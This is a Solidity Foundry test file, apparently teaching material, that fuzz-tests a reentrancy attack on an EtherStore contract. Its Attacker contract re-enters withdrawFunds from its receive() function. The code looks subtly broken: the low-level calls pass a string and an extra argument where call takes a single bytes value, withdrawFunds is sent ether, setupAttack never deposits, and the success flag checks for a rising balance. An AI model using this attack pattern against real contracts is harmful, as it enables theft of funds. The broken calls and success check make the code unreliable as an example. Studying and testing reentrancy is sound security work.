
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/EtherStore.sol";

contract TestReentrancyEtherStore is Test {

    EtherStore public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new EtherStore();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal <= type(uint128).max);
        vm.assume(attackVal > 0);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _contractUnderTest.depositFunds{value: attackVal}();
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    EtherStore public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackValue;

    constructor(address victimAddress) {
        victim = EtherStore(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        attackValue = val;
    }

    function attack(uint256 val) public {
        initialSnapshot = victim.balances(address(this));

        (bool success, ) = address(victim).call{value: val}("withdrawFunds(uint256)", val);
        require(success, "Initial withdrawFunds call failed");

        uint256 finalSnapshot = victim.balances(address(this));
        exploitSucceeded = (finalSnapshot > initialSnapshot);
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            (bool success, ) = address(victim).call{value: attackValue}("withdrawFunds(uint256)", attackValue);
            require(success, "Reentrant withdrawFunds call failed");
        }
    }
}
